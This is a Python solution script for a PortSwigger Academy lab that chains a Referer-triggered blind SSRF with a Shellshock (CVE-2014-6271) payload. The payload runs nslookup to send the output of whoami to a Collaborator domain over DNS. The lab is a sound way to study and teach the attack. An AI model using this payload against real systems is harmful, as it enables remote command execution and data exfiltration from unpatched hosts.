"""
Lab 6: Blind SSRF with Shellshock exploitation
https://portswigger.net/web-security/ssrf/blind/lab-blind-ssrf-with-shellshock-exploitation
Difficulty: Expert

📝 Same Referer-triggered blind SSRF as Lab 3, but this time the internal
system being reached is an old CGI script vulnerable to Shellshock
(CVE-2014-6271). We can't directly set headers on the SERVER's internal
request — but if the internal app reflects the Referer value into a header
of ITS OWN outbound/processed request, we can smuggle the Shellshock
payload through as the Referer value itself.

Goal: blind RCE on the internal host — proven by making it trigger an
outbound request back to our Collaborator.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
COLLABORATOR_URL = "http://YOUR-COLLABORATOR-ID.oastify.com"

# Classic Shellshock payload shape: define a function in an env-var-like
# string, then append commands that run regardless of the function body.
SHELLSHOCK_PAYLOAD = (
    "() {{ :; }}; /usr/bin/nslookup $(whoami).{collaborator}"
).format(collaborator=COLLABORATOR_URL.replace("http://", "").replace("https://", ""))


def run():
    s = get_session()

    note(f"Referer payload: {SHELLSHOCK_PAYLOAD}")
    r = s.get(f"{TARGET}/product?productId=1", headers={"Referer": SHELLSHOCK_PAYLOAD})
    log(f"Status: {r.status_code} (blind — no in-band confirmation expected)")

    note("Check Burp Collaborator for a DNS interaction whose subdomain is")
    note("the output of `whoami` on the internal host — that confirms RCE,")
    note("not just that the internal server was reached.")


if __name__ == "__main__":
    run()
